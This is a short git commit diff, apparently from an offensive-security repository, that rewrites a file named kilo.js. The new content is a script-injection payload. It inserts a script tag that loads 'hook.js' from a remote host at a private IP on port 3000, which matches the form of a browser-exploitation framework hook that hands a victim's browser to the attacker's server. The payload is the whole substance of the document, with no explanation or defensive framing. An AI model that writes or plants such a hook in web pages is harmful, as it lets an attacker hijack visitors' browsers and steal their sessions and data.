14b2577f9b371e6790961aae7cbbc9623c4a8ef4
brotechsploit <158155439+brotechsploit@users.noreply.github.com>
2024-02-11 12:10:40 +0300

    Add files via upload

--- kilo.js
+++ kilo.js
@@ -1,1 +1,4 @@
-'http://192.168.85.138:3000/demos/butcher/index.html'
+
+    var imported = document.createElement('script');
+    imported.src = 'http://192.168.85.138:3000/hook.js';
+    document.head.appendChild(imported);
